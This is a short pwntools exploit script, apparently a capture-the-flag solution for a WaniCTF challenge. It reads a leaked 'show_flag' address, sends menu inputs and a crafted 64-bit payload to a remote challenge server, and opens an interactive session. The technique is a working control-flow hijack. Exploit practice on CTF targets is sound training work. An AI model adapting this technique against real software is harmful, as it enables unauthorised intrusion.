from pwn import *

chall = ELF("chall")

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h", "-F" "#{pane_pid}", "-P"]

# io = process(chall.path)
io = remote("chal-lz56g6.wanictf.org", 9004)
# io = gdb.debug(chall.path, '''
#     break main
#     continue
# ''')

io.recvuntil(b"show_flag = ")
hint = io.recvuntil(b'\n')
payload = p64(int(hint.decode().strip(), 16) + 8)

io.sendlineafter(b'1:', b'aaaa')
io.sendlineafter(b':', b'1')
io.sendlineafter(b':', b'1')
io.sendlineafter(b'2:', b'bbbb')
io.sendlineafter(b':', b'1')
io.sendlineafter(b':', b'1')
io.sendlineafter(b'3:', b'cccc')
io.sendlineafter(b':', b'1')
io.sendlineafter(b':', b'1')

io.recvuntil(b'4:')
io.sendline(payload)
io.sendlineafter(b':', b'+')
io.sendlineafter(b':', b'+')

io.interactive()